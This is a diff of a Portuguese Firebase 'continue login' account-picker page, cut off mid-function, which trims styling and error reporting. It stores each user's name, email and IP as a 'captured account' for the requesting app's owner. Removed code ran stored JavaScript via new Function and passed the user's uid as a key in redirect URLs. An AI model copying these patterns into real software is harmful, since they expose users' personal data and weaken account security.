@@ -4,264 +4,44 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Continuar Login v3</title>
-  
-  <!-- CSS UNIFICADO -->
-  <link rel="stylesheet" href="https://alexandre7888.github.io/style.css">
-  
   <style>
-    /* ESTILOS ESPECÍFICOS DO CONTINUAR CONTA */
-    :root {
-      --primary-color: #4361ee;
-      --secondary-color: #3f37c9;
-      --accent-color: #4895ef;
-      --danger-color: #f72585;
-      --success-color: #4cc9f0;
-      --gray-color: #6c757d;
-    }
-    body {
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      padding: 20px;
-    }
-    .auth-container {
-      width: 100%;
-      max-width: 480px;
-      background: var(--bg-secondary);
-      border-radius: var(--radius-lg);
-      overflow: hidden;
-      box-shadow: var(--shadow);
-      animation: fadeIn 0.5s ease-out;
-    }
+    :root { --primary-color: #4361ee; --secondary-color: #3f37c9; --danger-color: #f72585; --gray-color: #6c757d; }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+    .auth-container { width: 100%; max-width: 480px; background: white; border-radius: 16px; overflow: hidden; box-shadow: 0 15px 30px rgba(0,0,0,0.2); animation: fadeIn 0.5s; }
     @keyframes fadeIn { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
-    .auth-header {
-      background: var(--primary-gradient);
-      color: white;
-      padding: 25px;
-      text-align: center;
-      position: relative;
-    }
-    .auth-header h1 {
-      font-size: 28px;
-      font-weight: 700;
-      margin-bottom: 5px;
-      word-break: break-word;
-    }
-    .auth-header p {
-      font-size: 14px;
-      opacity: 0.9;
-      word-break: break-word;
-    }
-    .auth-header .icon-img {
-      max-height: 60px;
-      border-radius: 50%;
-      margin-bottom: 10px;
-      background: rgba(255,255,255,0.15);
-      padding: 5px;
-    }
+    .auth-header { background: linear-gradient(to right, var(--primary-color), var(--secondary-color)); color: white; padding: 25px; text-align: center; }
+    .auth-header h1 { font-size: 24px; }
     .auth-content { padding: 30px; text-align: center; }
-    #status { margin: 20px 0; font-weight: bold; color: var(--text-primary); font-size: 16px; }
-    .login-redirect {
-      margin-top: 20px;
-      padding: 15px;
-      background: var(--bg-input);
-      border-radius: var(--radius-sm);
-      border-left: 4px solid var(--accent-color);
-    }
-    .login-link {
-      display: inline-block;
-      padding: 10px 20px;
-      background: var(--primary);
-      color: white;
-      text-decoration: none;
-      border-radius: 6px;
-      font-weight: 600;
-      transition: var(--transition);
-    }
-    .login-link:hover {
-      background: var(--primary-dark);
-      transform: translateY(-2px);
-    }
-    .header-actions { position: absolute; top: 20px; left: 20px; }
-    .home-btn {
-      background: rgba(255,255,255,0.2);
-      color: white;
-      border: none;
-      padding: 8px 16px;
-      border-radius: var(--radius-full);
-      font-size: 14px;
-      cursor: pointer;
-      transition: var(--transition);
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-    .home-btn:hover { background: rgba(255,255,255,0.3); }
-
+    #status { margin: 15px 0; font-weight: bold; color: #212529; }
+    .login-redirect { background: #f8f9fa; border-radius: 8px; padding: 15px; border-left: 4px solid var(--primary-color); }
+    .login-link { display: inline-block; padding: 10px 20px; background: var(--primary-color); color: white; text-decoration: none; border-radius: 6px; font-weight: 600; }
     .account-list { margin-top: 20px; text-align: left; }
-    .account-item {
-      display: flex; align-items: center; gap: 14px; padding: 12px 16px; border-radius: var(--radius-sm);
-      cursor: pointer; transition: var(--transition); border: 2px solid transparent; background: var(--bg-input); margin-bottom: 10px;
-    }
-    .account-item:hover { background: var(--bg-hover); border-color: var(--accent-color); }
-    .account-item.selected { border-color: var(--primary); background: rgba(67,97,238,0.1); }
-    .account-avatar {
-      width: 44px; height: 44px; border-radius: 50%; display: flex; align-items: center; justify-content: center;
-      color: white; font-weight: 700; font-size: 20px; flex-shrink: 0; text-transform: uppercase;
-    }
+    .account-item { display: flex; align-items: center; gap: 14px; padding: 12px 16px; border-radius: 10px; cursor: pointer; transition: 0.2s; border: 2px solid transparent; background: #f8f9fa; margin-bottom: 10px; }
+    .account-item:hover { border-color: var(--primary-color); }
+    .account-avatar { width: 44px; height: 44px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: 700; font-size: 20px; flex-shrink: 0; text-transform: uppercase; }
     .account-info { flex:1; min-width:0; }
-    .account-name { font-weight: 600; color: var(--text-primary); font-size: 16px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-    .account-email { color: var(--text-muted); font-size: 13px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-    .account-check { color: var(--primary); font-size: 20px; opacity: 0; transition: var(--transition); }
-    .account-item.selected .account-check { opacity: 1; }
-    .account-actions { margin-top: 20px; display: flex; gap: 10px; flex-wrap: wrap; }
-    .account-actions button { flex:1; padding: 12px; border-radius: var(--radius-sm); border: none; font-weight: 600; font-size: 15px; cursor: pointer; transition: var(--transition); min-width: 100px; }
-    .btn-primary { background: var(--primary); color: white; }
-    .btn-primary:hover { background: var(--primary-dark); }
-    .btn-outline { background: transparent; border: 2px solid var(--text-muted); color: var(--text-muted); }
-    .btn-outline:hover { background: var(--bg-input); }
-    .btn-custom { background: #9C27B0; color: white; }
-    .btn-custom:hover { background: #7B1FA2; }
-    .btn-contact { background: #FF9800; color: white; }
-    .btn-contact:hover { background: #F57C00; }
-    .btn-report { background: #f44336; color: white; }
-    .btn-report:hover { background: #d32f2f; }
-    .btn-support { background: #2ecc71; color: white; }
-    .btn-support:hover { background: #27ae60; }
-
-    .access-denied {
-      color: var(--danger);
-      font-size: 24px;
-      font-weight: 700;
-      padding: 40px 20px;
-    }
-    .extra-buttons {
-      margin-top: 20px;
-      display: flex;
-      flex-wrap: wrap;
-      gap: 10px;
-      justify-content: center;
-    }
-
-    /* ERROR BOX */
-    .error-box {
-      background: rgba(247,37,133,0.1);
-      border: 2px solid var(--danger);
-      border-radius: var(--radius-md);
-      padding: 20px;
-      margin: 15px 0;
-      text-align: left;
-    }
-    .error-box .error-title {
-      font-weight: 700;
-      font-size: 16px;
-      color: var(--danger);
-      margin-bottom: 8px;
-    }
-    .error-box .error-detail {
-      font-size: 13px;
-      color: var(--text-primary);
-      background: var(--bg-input);
-      padding: 10px;
-      border-radius: var(--radius-sm);
-      font-family: monospace;
-      word-break: break-all;
-      margin: 8px 0;
-      max-height: 150px;
-      overflow-y: auto;
-    }
-    .error-box .error-type {
-      font-size: 12px;
-      color: var(--text-muted);
-      margin-top: 8px;
-    }
-    .error-box .error-actions {
-      display: flex;
-      gap: 10px;
-      margin-top: 12px;
-      flex-wrap: wrap;
-    }
-    .error-box .error-actions button {
-      flex: 1;
-      padding: 10px 16px;
-      border: none;
-      border-radius: var(--radius-sm);
-      font-weight: 600;
-      font-size: 13px;
-      cursor: pointer;
-      transition: var(--transition);
-      min-width: 120px;
-    }
-    .error-box .error-actions .btn-support {
-      background: #2ecc71;
-      color: white;
-    }
-    .error-box .error-actions .btn-support:hover {
-      background: #27ae60;
-    }
-    .error-box .error-actions .btn-report-dev {
-      background: #f72585;
-      color: white;
-    }
-    .error-box .error-actions .btn-report-dev:hover {
-      background: #d32f2f;
-    }
-    .error-box .error-actions .btn-retry {
-      background: var(--primary);
-      color: white;
-    }
-    .error-box .error-actions .btn-retry:hover {
-      background: var(--primary-dark);
-    }
+    .account-name { font-weight: 600; color: #212529; font-size: 16px; }
+    .account-email { color: var(--gray-color); font-size: 13px; }
+    .btn { padding: 12px; border-radius: 8px; border: none; font-weight: 600; font-size: 15px; cursor: pointer; transition: 0.2s; width: 100%; margin-top: 8px; }
+    .btn-primary { background: var(--primary-color); color: white; }
+    .btn-primary:hover { background: var(--secondary-color); }
   </style>
 </head>
 <body>
   <div class="auth-container">
-    <div class="auth-header" id="header">
-      <div class="header-actions">
-        <button class="home-btn" onclick="goToIndex()">🏠 Início</button>
-      </div>
-      <div id="iconPlaceholder"></div>
+    <div class="auth-header">
       <h1 id="appTitle">Continuar Login</h1>
-      <p id="appSubtitle">Selecione uma conta para continuar</p>
+      <p id="appSubtitle">Selecione uma conta</p>
     </div>
-
     <div class="auth-content">
       <div id="status">Verificando...</div>
-      
-      <!-- Área de erro personalizada -->
-      <div id="errorBox" class="error-box" style="display:none;">
-        <div class="error-title" id="errorTitle">❌ Ocorreu um erro</div>
-        <div class="error-detail" id="errorDetail">Detalhes do erro...</div>
-        <div class="error-type" id="errorType">Tipo: Desconhecido</div>
-        <div class="error-actions" id="errorActions"></div>
-      </div>
-
-      <div id="accessDenied" style="display:none;">
-        <div class="access-denied">🚫 Acesso Negado</div>
-        <p class="text-muted">Seu IP está bloqueado neste aplicativo.</p>
-        <button class="btn btn-danger btn-block" onclick="reportError('IP bloqueado', true)">📧 Reportar erro</button>
-      </div>
-
       <div id="account-selection" style="display:none;">
-        <div style="margin-bottom:12px;font-size:14px;color:var(--text-secondary);font-weight:500;">Selecione uma conta para continuar</div>
         <div id="account-list-container" class="account-list"></div>
-        <div class="account-actions">
-          <button id="confirmAccountBtn" class="btn btn-primary">Continuar com esta conta</button>
-          <button id="cancelSelectionBtn" class="btn btn-outline">Cancelar</button>
-        </div>
+        <button id="confirmAccountBtn" class="btn btn-primary">Continuar</button>
       </div>
-
-      <div id="extraButtons" class="extra-buttons" style="display:none;">
-        <button id="contactBtn" class="btn btn-contact" style="display:none;">📞 Contato</button>
-        <button id="customActionBtn" class="btn btn-custom" style="display:none;">⚡ Ação</button>
-        <button id="reportBtn" class="btn btn-report" style="display:none;">📧 Reportar erro</button>
-      </div>
-
       <div id="login-redirect" class="login-redirect" style="display:none;">
-        <p class="text-muted">Você precisa fazer login para continuar</p>
+        <p>Você precisa fazer login</p>
         <a id="loginLink" href="#" class="login-link">Fazer Login</a>
       </div>
     </div>
@@ -269,7 +49,7 @@
 
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
-    import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-auth.js";
+    import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-auth.js";
     import { getDatabase, ref, get, set } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";
 
     const firebaseConfig = {
@@ -279,603 +59,135 @@
       projectId: "html-15e80",
       storageBucket: "html-15e80.appspot.com",
       messagingSenderId: "1068148640439",
-      appId: "1:1068148640439:web:7cc5bde34f4c5a5ce41b32",
-      measurementId: "G-V57KRZ02HJ"
+      appId: "1:1068148640439:web:7cc5bde34f4c5a5ce41b32"
     };
 
     const app = initializeApp(firebaseConfig);
     const auth = getAuth(app);
     const db = getDatabase(app);
 
-    // Elementos
-    const statusEl = document.getElementById('status');
-    const loginRedirectEl = document.getElementById('login-redirect');
-    const loginLinkEl = document.getElementById('loginLink');
-    const accountSelectionDiv = document.getElementById('account-selection');
-    const accountListContainer = document.getElementById('account-list-container');
-    const confirmAccountBtn = document.getElementById('confirmAccountBtn');
-    const cancelSelectionBtn = document.getElementById('cancelSelectionBtn');
-    const accessDeniedDiv = document.getElementById('accessDenied');
-    const appTitle = document.getElementById('appTitle');
-    const appSubtitle = document.getElementById('appSubtitle');
-    const iconPlaceholder = document.getElementById('iconPlaceholder');
-    const contactBtn = document.getElementById('contactBtn');
-    const customActionBtn = document.getElementById('customActionBtn');
-    const reportBtn = document.getElementById('reportBtn');
-    const extraButtonsDiv = document.getElementById('extraButtons');
-    
-    // Error Box
-    const errorBox = document.getElementById('errorBox');
-    const errorTitle = document.getElementById('errorTitle');
-    const errorDetail = document.getElementById('errorDetail');
-    const errorType = document.getElementById('errorType');
-    const errorActions = document.getElementById('errorActions');
-
     const urlParams = new URLSearchParams(window.location.search);
     const appToken = urlParams.get('token');
     const redirectUrlParam = urlParams.get('redirecturl');
 
     let currentUser = null;
-    let accountsList = [];
-    let selectedAccountUid = null;
     let tokenData = null;
     let clientIP = '';
-    let currentEditingToken = null;
-    let lastError = null;
-    let isConfigError = false;
 
-    // ===== FUNÇÕES =====
-    function getClientIP() {
-      return fetch('https://api.ipify.org?format=json')
-        .then(r => r.json())
-        .then(data => data.ip)
-        .catch(() => 'IP não disponível');
+    async function getClientIP() {
+      try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); return d.ip; } catch { return 'N/A'; }
     }
 
-    function goToIndex() {
-      window.location.href = 'https://alexandre7888.github.io/auth.html';
-    }
-    window.goToIndex = goToIndex;
-
-    function redirectToLogin() {
-      const url = appToken ? `https://alexandre7888.github.io/auth.html?token=${appToken}` : 'https://alexandre7888.github.io/auth.html';
-      window.location.href = url;
-    }
-
-    // ===== SISTEMA DE ERROS INTELIGENTE =====
-    function showError(error, isConfigError = false) {
-      lastError = error;
-      
-      errorBox.style.display = 'block';
-      errorTitle.textContent = isConfigError ? '⚠️ Erro de Configuração' : '❌ Erro no Sistema';
-      errorDetail.textContent = error.message || 'Erro desconhecido';
-      errorType.textContent = isConfigError ? 'Tipo: Configuração (entre em contato com o desenvolvedor do app)' : 'Tipo: Sistema (entre em contato com o suporte CodeHub)';
-      
-      errorActions.innerHTML = '';
-      
-      if (isConfigError) {
-        // Erro de CONFIGURAÇÃO → Reportar ao DESENVOLVEDOR
-        const btnDev = document.createElement('button');
-        btnDev.className = 'btn-report-dev';
-        btnDev.textContent = '📧 Reportar ao Desenvolvedor';
-        btnDev.onclick = () => reportErrorToDeveloper(error);
-        errorActions.appendChild(btnDev);
-        
-        // Botão de tentar novamente
-        const btnRetry = document.createElement('button');
-        btnRetry.className = 'btn-retry';
-        btnRetry.textContent = '🔄 Tentar Novamente';
-        btnRetry.onclick = () => {
-          errorBox.style.display = 'none';
-          window.location.reload();
-        };
-        errorActions.appendChild(btnRetry);
-        
-        // Se tiver contato do desenvolvedor, mostra também
-        if (tokenData?.contactInfo) {
-          const btnContact = document.createElement('button');
-          btnContact.className = 'btn-contact';
-          btnContact.textContent = `📞 ${tokenData.contactInfo}`;
-          btnContact.onclick = () => {
-            const info = tokenData.contactInfo;
-            if (info.includes('@')) window.location.href = `mailto:${info}`;
-            else if (info.startsWith('http')) window.open(info, '_blank');
-            else window.open(`tel:${info}`, '_blank');
-          };
-          errorActions.appendChild(btnContact);
-        }
-      } else {
-        // Erro de CÓDIGO → Reportar ao SUPORTE CODEHUB
-        const btnSupport = document.createElement('button');
-        btnSupport.className = 'btn-support';
-        btnSupport.textContent = '🆘 Enviar para Suporte CodeHub';
-        btnSupport.onclick = () => reportToCodeHubSupport(error);
-        errorActions.appendChild(btnSupport);
-        
-        // Botão de tentar novamente
-        const btnRetry = document.createElement('button');
-        btnRetry.className = 'btn-retry';
-        btnRetry.textContent = '🔄 Tentar Novamente';
-        btnRetry.onclick = () => {
-          errorBox.style.display = 'none';
-          window.location.reload();
-        };
-        errorActions.appendChild(btnRetry);
-      }
-      
-      statusEl.textContent = '❌ Erro';
-    }
-
-    // ===== REPORTAR PARA O DESENVOLVEDOR (erro de configuração) =====
-    function reportErrorToDeveloper(error) {
-      const appName = tokenData?.appName || 'Aplicativo';
-      const contactInfo = tokenData?.contactInfo || '';
-      const subject = `[CodeHub] Erro de Configuração - ${appName}`;
-      
-      const errorReport = `
-        ⚠️ ERRO DE CONFIGURAÇÃO NO APP: ${appName}
-        
-        Token: ${appToken || 'N/A'}
-        Domínio configurado: ${tokenData?.customDomain || tokenData?.domains?.[0] || 'N/A'}
-        Domínios permitidos: ${tokenData?.domains?.join(', ') || 'Nenhum'}
-        IPs bloqueados: ${tokenData?.blockedIPs?.join(', ') || 'Nenhum'}
-        
-        🔍 Erro: ${error.message || 'Erro desconhecido'}
-        📍 URL: ${window.location.href}
-        
-        📱 Dispositivo:
-        - IP: ${clientIP || 'N/A'}
-        - User-Agent: ${navigator.userAgent}
-        - Plataforma: ${navigator.platform}
-        - Data/Hora: ${new Date().toISOString()}
-        
-        💡 Sugestão: Verifique se o domínio configurado no Criador de Aplicativos está correto e se a URL de redirecionamento corresponde ao domínio.
-      `;
-      
-      if (contactInfo.includes('@')) {
-        window.open(`mailto:${contactInfo}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(errorReport)}`);
-      } else if (contactInfo.startsWith('http')) {
-        window.open(contactInfo, '_blank');
-      } else {
-        // Fallback: copia para área de transferência
-        navigator.clipboard.writeText(errorReport).then(() => {
-          alert('✅ Relatório de erro copiado para a área de transferência. Envie para o desenvolvedor do app.');
-        });
-      }
-    }
-
-    // ===== REPORTAR PARA O SUPORTE CODEHUB (erro de código) =====
-    function reportToCodeHubSupport(error) {
-      const subject = `[CodeHub] Erro no Sistema - ${appToken || 'sem token'}`;
-      const errorReport = `
-        🚨 ERRO NO SISTEMA CODEHUB
-        
-        Token: ${appToken || 'N/A'}
-        App: ${tokenData?.appName || 'N/A'}
-        Domínio: ${tokenData?.customDomain || tokenData?.domains?.[0] || 'N/A'}
-        
-        🔍 Erro: ${error.message || 'Erro desconhecido'}
-        📍 Stack: ${error.stack || 'N/A'}
-        📍 URL: ${window.location.href}
-        
-        📱 Dispositivo:
-        - IP: ${clientIP || 'N/A'}
-        - User-Agent: ${navigator.userAgent}
-        - Plataforma: ${navigator.platform}
-        - Data/Hora: ${new Date().toISOString()}
-        
-        🔧 Configuração do Token:
-        ${JSON.stringify(tokenData, null, 2)}
-      `;
-      
-      window.open(`mailto:codehub.k@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(errorReport)}`);
-    }
-
-    // ===== REPORTAR ERRO (botão vermelho) =====
-    window.reportError = function(description, isConfig = false) {
-      if (lastError) {
-        if (isConfig || isConfigError) {
-          reportErrorToDeveloper(lastError);
-        } else {
-          reportToCodeHubSupport(lastError);
-        }
-      } else {
-        // Erro genérico
-        const subject = `[CodeHub] Erro Reportado - ${appToken || 'sem token'}`;
-        const report = `
-          📋 Relatório de Erro
-          
-          Token: ${appToken || 'N/A'}
-          App: ${tokenData?.appName || 'N/A'}
-          Descrição: ${description || 'Erro não especificado'}
-          IP: ${clientIP || 'N/A'}
-          Data/Hora: ${new Date().toISOString()}
-          URL: ${window.location.href}
-        `;
-        window.open(`mailto:codehub.k@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(report)}`);
-      }
-    };
-
-    // ===== GERAR ID INTERNO =====
     function generateAccountId() {
       return 'acc_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8);
     }
 
-    // ===== CARREGAR TOKEN =====
     async function loadTokenData(token) {
-      try {
-        let snap = await get(ref(db, `tokens/${token}`));
-        if (!snap.exists()) {
-          snap = await get(ref(db, `tokens/token/${token}`));
-        }
-        if (snap.exists()) {
-          tokenData = snap.val();
-          return tokenData;
-        }
-        throw new Error('Token não encontrado no Firebase. Verifique se o token é válido.');
-      } catch (e) {
-        throw e;
-      }
+      let snap = await get(ref(db, `tokens/${token}`));
+      if (!snap.exists()) snap = await get(ref(db, `tokens/token/${token}`));
+      if (snap.exists()) return snap.val();
+      throw new Error('Token inválido.');
     }
 
-    // ===== VERIFICAR IP BLOQUEADO =====
-    function isIPBlocked(ip, blockedList) {
-      if (!ip || !blockedList || blockedList.length === 0) return false;
-      return blockedList.includes(ip);
-    }
-
-    // ===== VERIFICAR DOMÍNIO =====
-    function isDomainAllowed(domain, allowedDomains) {
-      if (!allowedDomains || allowedDomains.length === 0) return true;
-      return allowedDomains.some(d => d === domain);
-    }
-
-    function validateRedirectUrl(redirectUrl, customDomain) {
-      try {
-        const url = new URL(redirectUrl);
-        const hostname = url.hostname.replace(/^www\./, '');
-        const cleanDomain = customDomain.replace(/^www\./, '');
-        return hostname === cleanDomain;
-      } catch {
-        return false;
-      }
-    }
-
-    function getFinalRedirectUrl(customDomain) {
-      if (redirectUrlParam) {
-        if (validateRedirectUrl(redirectUrlParam, customDomain)) {
-          return redirectUrlParam;
-        }
-        throw new Error(`A URL de redirecionamento "${redirectUrlParam}" não corresponde ao domínio configurado "${customDomain}".`);
-      }
-      return `https://${customDomain}/index.html`;
-    }
-
-    // ===== SALVAR CONTA CAPTURADA =====
-    async function saveCapturedAccount(uid, email, nome, ip) {
-      if (!currentEditingToken) return;
-
+    async function saveCapturedAccount(uid, email, nome, ip, token) {
       const accountId = generateAccountId();
-      const accountData = {
-        id: accountId,
-        nome: nome || 'Usuário',
-        email: email || '',
-        ip: ip || 'N/A',
-        capturedAt: new Date().toISOString()
-      };
-
-      try {
-        const accountRef = ref(db, `tokens/${currentEditingToken}/accounts/${accountId}`);
-        await set(accountRef, accountData);
-        
-        try {
-          const accountRef2 = ref(db, `tokens/token/${currentEditingToken}/accounts/${accountId}`);
-          await set(accountRef2, accountData);
-        } catch (e) {
-          // Ignora erro no segundo caminho
-        }
-        
-        return accountId;
-      } catch (e) {
-        throw new Error('Erro ao salvar conta capturada: ' + e.message);
-      }
+      const accountData = { id: accountId, nome: nome || 'Usuário', email: email || '', ip: ip || 'N/A', capturedAt: new Date().toISOString() };
+      await set(ref(db, `tokens/${token}/accounts/${accountId}`), accountData);
+      await set(ref(db, `tokens/token/${token}/accounts/${accountId}`), accountData);
     }
 
-    // ===== APLICAR CONFIGURAÇÕES =====
-    function applyTokenSettings(data) {
-      if (!data) return;
-      const domain = data.customDomain || data.domains?.[0] || 'domínio não definido';
-      appTitle.textContent = data.appName || 'Continuar Login';
-      appSubtitle.textContent = `🔗 ${domain}`;
-
-      if (data.icon) {
-        iconPlaceholder.innerHTML = `<img src="${data.icon}" class="icon-img" alt="ícone" onerror="this.style.display='none'" />`;
-      }
-
-      if (data.contactInfo) {
-        contactBtn.style.display = 'inline-block';
-        contactBtn.textContent = `📞 ${data.contactInfo}`;
-        contactBtn.onclick = () => {
-          const info = data.contactInfo;
-          if (info.includes('@')) window.location.href = `mailto:${info}`;
-          else if (info.startsWith('http')) window.open(info, '_blank');
-          else window.open(`tel:${info}`, '_blank');
-        };
-      } else {
-        contactBtn.style.display = 'none';
-      }
-
-      if (data.customJs && data.customJs.trim()) {
-        customActionBtn.style.display = 'inline-block';
-        customActionBtn.textContent = '⚡ Ação';
-        customActionBtn.onclick = () => {
-          try {
-            new Function(data.customJs)();
-          } catch (e) {
-            showError(new Error('Erro na ação customizada: ' + e.message), true);
-          }
-        };
-      } else {
-        customActionBtn.style.display = 'none';
-      }
-
-      reportBtn.style.display = 'inline-block';
-      reportBtn.onclick = () => {
-        if (lastError) {
-          if (isConfigError) {
-            reportErrorToDeveloper(lastError);
-          } else {
-            reportToCodeHubSupport(lastError);
-          }
-        } else {
-          reportToCodeHubSupport(new Error('Erro reportado pelo usuário'));
-        }
-      };
-
-      extraButtonsDiv.style.display = 'flex';
+    function redirectToLogin() {
+      window.location.href = appToken ? `https://alexandre7888.github.io/auth.html?token=${appToken}` : 'https://alexandre7888.github.io/auth.html';
     }
 
-    // ===== CARREGAR CONTAS DA MASTER KEY =====
-    async function loadAccountsFromMasterKey(masterKey) {
-      try {
-        const snap = await get(ref(db, `contas/${masterKey}`));
-        if (snap.exists()) {
-          return Object.values(snap.val());
-        }
-        return [];
-      } catch (e) {
-        throw new Error('Erro ao carregar contas: ' + e.message);
-      }
-    }
-
-    // ===== EXIBIR LISTA DE CONTAS =====
-    function renderAccountList(accounts) {
-      accountListContainer.innerHTML = '';
-      if (accounts.length === 0) {
-        accountListContainer.innerHTML = `
-          <div style="text-align:center;color:var(--text-muted);padding:20px;">
-            <p>Nenhuma conta encontrada para esta Master Key.</p>
-          </div>
-        `;
-        confirmAccountBtn.disabled = true;
-        return;
-      }
-
-      confirmAccountBtn.disabled = false;
-      selectedAccountUid = null;
-
-      accounts.forEach(acc => {
-        const item = document.createElement('div');
-        item.className = 'account-item';
-        if (currentUser && acc.uid === currentUser.uid) {
-          item.classList.add('selected');
-          selectedAccountUid = acc.uid;
-        }
-
-        const avatar = document.createElement('div');
-        avatar.className = 'account-avatar';
-        const initial = (acc.username || acc.email || '?').charAt(0).toUpperCase();
-        avatar.textContent = initial;
-        const colors = ['#4361ee','#f72585','#4cc9f0','#7209b7','#f8961e','#43aa8b','#e63946','#277da1'];
-        let hash = 0;
-        const name = acc.username || acc.email || '?';
-        for (let i=0; i<name.length; i++) hash = name.charCodeAt(i) + ((hash << 5) - hash);
-        avatar.style.background = colors[Math.abs(hash) % colors.length];
-
-        const info = document.createElement('div');
-        info.className = 'account-info';
-        const nameDiv = document.createElement('div');
-        nameDiv.className = 'account-name';
-        nameDiv.textContent = acc.username || acc.email || 'Usuário';
-        const emailDiv = document.createElement('div');
-        emailDiv.className = 'account-email';
-        emailDiv.textContent = acc.email || '';
-
-        info.appendChild(nameDiv);
-        info.appendChild(emailDiv);
-
-        const check = document.createElement('div');
-        check.className = 'account-check';
-        check.textContent = '✓';
-
-        item.appendChild(avatar);
-        item.appendChild(info);
-        item.appendChild(check);
-
-        item.addEventListener('click', () => {
-          document.querySelectorAll('.account-item').forEach(el => el.classList.remove('selected'));
-          item.classList.add('selected');
-          selectedAccountUid = acc.uid;
-        });
-
-        accountListContainer.appendChild(item);
-      });
-    }
-
-    // ===== PROSSEGUIR COM CONTA =====
-    async function proceedWithAccount(uid) {
-      try {
-        statusEl.textContent = 'Preparando sessão...';
-
-        const userDataRef = ref(db, `userKeysData/${uid}`);
-        const snap = await get(userDataRef);
-        const userData = snap.exists() ? snap.val() : null;
-
-        const nome = userData?.nome || userData?.username || currentUser?.displayName || 'Usuário';
-        const email = userData?.email || currentUser?.email || '';
-
-        await saveCapturedAccount(uid, email, nome, clientIP);
-
-        const customDomain = tokenData.customDomain || tokenData.domains?.[0];
-        
-        if (!customDomain) {
-          isConfigError = true;
-          throw new Error('Nenhum domínio configurado para este token. Configure um domínio no Criador de Aplicativos.');
-        }
-
-        const finalRedirectUrl = getFinalRedirectUrl(customDomain);
-
-        if (tokenData.domains && tokenData.domains.length > 0) {
-          try {
-            const url = new URL(finalRedirectUrl);
-            const hostname = url.hostname.replace(/^www\./, '');
-            if (!isDomainAllowed(hostname, tokenData.domains)) {
-              isConfigError = true;
-              throw new Error(`Domínio "${hostname}" não está na lista de domínios permitidos.`);
-            }
-          } catch (e) {
-            if (e.message.includes('não está na lista')) {
-              isConfigError = true;
-            }
-            throw e;
-          }
-        }
-
-        localStorage.setItem('current_userKey', uid);
-        await set(ref(db, `userKeysData/${uid}/lastLogin`), Date.now());
-
-        const sep = finalRedirectUrl.includes('?') ? '&' : '?';
-        const urlFinal = finalRedirectUrl + sep + `userKey=${encodeURIComponent(uid)}`;
-        
-        statusEl.textContent = 'Redirecionando...';
-        window.location.href = urlFinal;
-
-      } catch (err) {
-        showError(err, isConfigError);
-        statusEl.textContent = '❌ Erro';
-      }
-    }
-
-    // ===== INÍCIO =====
     async function init() {
+      clientIP = await getClientIP();
+      if (!appToken) return window.location.href = 'https://alexandre7888.github.io/auth.html';
+      
       try {
-        clientIP = await getClientIP();
-
-        if (!appToken) {
-          isConfigError = true;
-          throw new Error('Token não encontrado na URL. Verifique se o link está correto.');
-        }
-
-        currentEditingToken = appToken;
         tokenData = await loadTokenData(appToken);
+        document.getElementById('appTitle').textContent = tokenData.appName || 'Continuar Login';
+        document.getElementById('appSubtitle').textContent = tokenData.domains?.[0] || 'App';
         
-        if (!tokenData) {
-          isConfigError = true;
-          throw new Error('Token inválido ou não encontrado no Firebase.');
-        }
-
-        applyTokenSettings(tokenData);
-
-        if (tokenData.blockedIPs && tokenData.blockedIPs.length > 0) {
-          if (isIPBlocked(clientIP, tokenData.blockedIPs)) {
-            accessDeniedDiv.style.display = 'block';
-            statusEl.textContent = 'Acesso negado';
-            accountSelectionDiv.style.display = 'none';
-            return;
-          }
+        if (tokenData.blockedIPs && tokenData.blockedIPs.includes(clientIP)) {
+          document.getElementById('status').textContent = '🚫 Acesso Negado';
+          return;
         }
 
         onAuthStateChanged(auth, async (user) => {
-          try {
-            if (!user) {
-              statusEl.textContent = 'Você não está autenticado';
-              loginRedirectEl.style.display = 'block';
-              accountSelectionDiv.style.display = 'none';
-              return;
-            }
-
-            currentUser = user;
-            loginRedirectEl.style.display = 'none';
-            accountSelectionDiv.style.display = 'block';
-
-            let masterKey = localStorage.getItem('codehub_masterKey');
-            
-            if (!masterKey) {
-              const snap = await get(ref(db, `userKeysData/${user.uid}`));
-              if (snap.exists()) {
-                masterKey = snap.val().masterKey || null;
-              }
-            }
-            if (!masterKey) {
-              const snap2 = await get(ref(db, `users/${user.uid}`));
-              if (snap2.exists()) {
-                masterKey = snap2.val().masterKey || null;
-              }
-            }
-            if (!masterKey) {
-              masterKey = 'master_' + Date.now() + '_' + Math.random().toString(36).substr(2,12);
-              await set(ref(db, `userKeysData/${user.uid}/masterKey`), masterKey);
-              localStorage.setItem('codehub_masterKey', masterKey);
-            } else {
-              localStorage.setItem('codehub_masterKey', masterKey);
-            }
-
-            const accounts = await loadAccountsFromMasterKey(masterKey);
-            accountsList = accounts;
-            renderAccountList(accounts);
-
-            statusEl.textContent = 'Selecione uma conta para continuar';
-
-            if (accounts.length === 1) {
-              selectedAccountUid = accounts[0].uid;
-              document.querySelector('.account-item')?.classList.add('selected');
-            }
-          } catch (err) {
-            showError(err, true);
+          if (!user) {
+            document.getElementById('status').textContent = 'Não autenticado';
+            document.getElementById('login-redirect').style.display = 'block';
+            return;
           }
-        });
+          currentUser = user;
+          document.getElementById('login-redirect').style.display = 'none';
+          document.getElementById('account-selection').style.display = 'block';
+          document.getElementById('status').textContent = 'Carregando contas...';
 
-      } catch (err) {
-        showError(err, isConfigError);
+          let masterKey = localStorage.getItem('codehub_masterKey');
